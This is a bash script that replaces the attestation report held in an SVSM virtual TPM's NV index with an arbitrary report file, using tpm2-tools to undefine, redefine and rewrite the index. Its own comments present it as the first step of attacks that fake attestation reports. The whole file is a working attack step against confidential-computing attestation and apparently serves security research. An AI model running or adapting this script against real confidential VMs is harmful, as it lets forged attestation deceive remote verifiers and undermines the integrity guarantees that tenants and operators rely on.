#!/bin/bash

# This simple function overwrites the attestation report in an SVSM vTPM.
# This is a pre-requisite of any attack that involves faking an attestation report.

if [ "$EUID" -ne 0 ]; then
    echo "Please run it as root"
    exit 1
fi

if [[ $# -eq 1 ]]; then
    new_attestation_report=$1
else
    # The sev-guest-get-report tool is provided by
    # https://github.com/AMDESE/sev-guest
    if which sev-guest-get-report &> /dev/null; then
        new_attestation_report=/tmp/guest_report.bin
        if ! sev-guest-get-report ${new_attestation_report} &> /dev/null; then
            echo "Failed to generate an attestation report"
            echo "Please generate one manually and provide it to this script"
            echo "Usage: $0 [attestation_report_file]"
            exit 1
        fi
    else
        echo "sev-guest-get-report tool not found"
        exit 1
    fi
fi

filelen=$(wc -c ${new_attestation_report} | awk '{ print $1 }')
if [[ ${filelen} != 1184 ]]; then
    echo "${new_attestation_report} is not a valid attestation report"
    exit 1
fi

# tpm2-tools package
tpm2_nvundefine -C p 0x1c00002
tpm2_nvdefine -Q 0x1c00002 -C o -s 1184 -a "ownerread|ownerwrite|policywrite|read_stclear|policyread|ppread|ownerread|authread|no_da"
tpm2_nvwrite -Q 0x1c00002 -C o -i ${new_attestation_report}
